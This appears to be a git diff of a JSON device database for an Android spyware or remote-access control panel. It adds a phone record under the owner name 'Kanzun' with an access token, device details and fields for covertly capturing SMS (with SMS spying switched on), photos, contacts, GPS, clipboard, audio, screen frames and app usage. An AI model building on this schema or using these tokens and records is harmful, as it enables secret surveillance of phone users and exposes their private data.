@@ -4,7 +4,7 @@
     "deviceName": "HP-JASZ_X-6DDF",
     "ownerUsername": "c6d90c96-224f-4890-a851-0704858e64df",
     "token": "dfdac948335c50f8b143f9f65867386d",
-    "lastSeen": 1777287721113,
+    "lastSeen": 1777287742151,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:00:00.743Z",
@@ -140,5 +140,37 @@
       "frameId": 1699,
       "capturedAt": 1777278410627
     }
+  },
+  {
+    "deviceId": "aimlock_199e3579",
+    "deviceName": "HP-PEGASUS-B240",
+    "ownerUsername": "Kanzun",
+    "token": "5d33b8ecb200f311ed19db054f831b4d",
+    "lastSeen": 1777287742793,
+    "commandQueue": [],
+    "online": true,
+    "connectedAt": "2026-04-27T11:02:22.793Z",
+    "deviceInfo": {
+      "model": "realme RMX3938",
+      "androidVersion": "Android 14",
+      "battery": 45,
+      "network": "Seluler: 3",
+      "sim1": "3",
+      "sim2": "Tidak ada layanan"
+    },
+    "lastPhoto": null,
+    "lastScreenFrame": null,
+    "smsSpyActive": true,
+    "smsMessages": [],
+    "galleryPhotos": [],
+    "galleryDone": false,
+    "contacts": [],
+    "lastGps": null,
+    "gpsList": [],
+    "lastClipboard": null,
+    "lastAudio": null,
+    "audioList": [],
+    "lastAppUsage": null,
+    "appList": null
   }
 ]
